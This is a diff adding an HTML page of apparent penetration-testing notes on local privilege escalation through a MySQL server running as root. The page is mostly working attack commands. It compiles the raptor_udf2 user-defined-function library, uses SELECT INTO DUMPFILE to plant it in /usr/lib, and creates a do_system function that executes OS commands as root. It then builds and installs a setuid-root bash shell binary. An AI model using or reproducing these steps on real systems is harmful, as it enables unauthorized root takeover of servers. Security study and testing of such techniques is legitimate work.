@@ -1,0 +1,56 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Local Priv Esc Running as Root</title>
+</head><body><a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/">https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a>&nbsp;<br/>
+<br/>
+Using the raptor_udf2.c function (user defined function)<br/>
+<br/>
+Requirements:<br/>
+&nbsp;mysql running as root<br/>
+&nbsp;gcc installed to compile (maybe possible to compile before hand)<br/>
+<br/>
+This is done in a two step process; first compiling a ELF binary, then from that compiled ELF binary, a shared object is created. The two steps needed to be taken are:<br/>
+&nbsp; &nbsp; gcc -g -c raptor_udf2.c<br/>
+&nbsp; &nbsp; gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br/>
+<br/>
+After the files have been compiled, the next stage is creating the function in the MySQL database. The procedure for this task is the following:<br/>
+<br/>
+&nbsp; &nbsp; Access the database service and select the database to use.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; mysql -u root<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; use mysql;<br/>
+&nbsp; &nbsp; Copy/create the raptor_udf2.so in the directory specified in the plugin_dir variable.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; create table foo(line blob);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; insert into foo values(load_file(‘/home/raptor/raptor_udf2.so’));<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;<br/>
+&nbsp; &nbsp; Create the User Defined Function.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; create function do_system returns integer soname ‘raptor_udf2.so’;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; select * from mysql.func;<br/>
+&nbsp; &nbsp; Test that the UDF works correctly.<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; select do_system(‘id &gt; /tmp/out; chown centos.centos /tmp/out’);<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; \! sh<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cat /tmp/out<br/>
+<br/>
+This should indicate the command ran as the root user<br/>
+<br/>
+NOTE:<br/>
+Because of permissions, a non-root user should not be able to copy/move the shared library file to the /usr/lib directory. This is why the MySQL service was used to perform the action.<br/>
+<br/>
+Use a SETUID binary that accesses the /bin/sh binary. A SETUID binary is a binary that allows users to execute the binary with the permissions of the executables owner.<br/>
+&#09;<br/>
+#include &lt;stdio.h&gt;<br/>
+#include &lt;sys/types.h&gt;<br/>
+#include &lt;unistd.h&gt;<br/>
+int main(void)<br/>
+{<br/>
+setuid(0); setgid(0); system("/bin/bash");<br/>
+}<br/>
+<br/>
+Then using the UDF to compile the SETUID binary and then setting the root permissions for the file, and once that is done executing the binary:<br/>
+<br/>
+&nbsp; &nbsp; select do_system(‘gcc -o /tmp/setuid /home/centos/setuid.c’);<br/>
+&nbsp; &nbsp; select do_system(‘chmod u+s /tmp/setuid’);<br/>
+&nbsp; &nbsp; \! sh <br/>
+<br/>
+</body></html>
